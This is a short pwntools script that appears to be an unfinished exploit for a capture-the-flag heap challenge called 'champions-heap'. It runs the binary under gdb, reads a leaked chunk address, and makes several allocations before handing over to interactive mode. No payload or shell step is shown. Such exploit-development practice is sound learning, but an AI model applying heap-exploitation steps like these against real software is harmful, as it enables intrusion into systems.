from pwn import *

elf = ELF('./champions-heap')
context.binary = elf
p = gdb.debug(elf.path, gdbscript='b menu')
libc = ELF('./libc.so.6')

p.recvuntil('Gift: ')
address_of_2nd_chunk = p.recvline().split(b'\n')[0]

log.warn(b'2nd chunk starts at : ' + address_of_2nd_chunk)

log.warn('libc at : ' + str(hex(libc.address)))

p.recv()

p.sendline(b'PLAYER')
p.recv()

for i in range(5):
	p.sendline('1')
	p.recv()
	p.sendline('1000')
	p.recv()
	p.sendline('\x00')
	p.recv()

p.interactive()
